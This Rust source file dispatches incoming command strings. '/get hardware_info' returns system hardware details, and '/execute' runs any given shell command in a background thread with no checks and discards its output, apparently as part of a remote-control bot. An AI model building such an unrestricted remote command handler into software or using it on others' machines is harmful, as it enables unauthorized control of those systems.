use std::collections::HashMap;
use std::thread;

use crate::libs::command_executer_lib;
use crate::libs::hardware_lib;

pub fn hook_to_command(COMMAND: &str) -> String {
    let mut commands: HashMap<&str, fn() -> String> = HashMap::new();

    commands.insert("/get hardware_info", _FUNC_HARDWAREINFO);
    if let Some(rest) = COMMAND.strip_prefix("/execute ") {
        _FUNC_EXECUTE_COMMAND(rest)
    }
    else if let Some(&function) = commands.get(COMMAND) {
        function()
    } else {
        return format!("Unknown command: {}", COMMAND);
    }

}

fn _FUNC_HARDWAREINFO() -> String{
    hardware_lib::get_hardware_info()
}

fn _FUNC_EXECUTE_COMMAND(command_input: &str) -> String {
    let command = command_input.to_string();

    thread::spawn(move || {
        command_executer_lib::execute_command(&command);
        // Command output is discarded since we're not waiting
    });

    // Return immediately without blocking
    format!("Command '{}' started in background", command_input)
}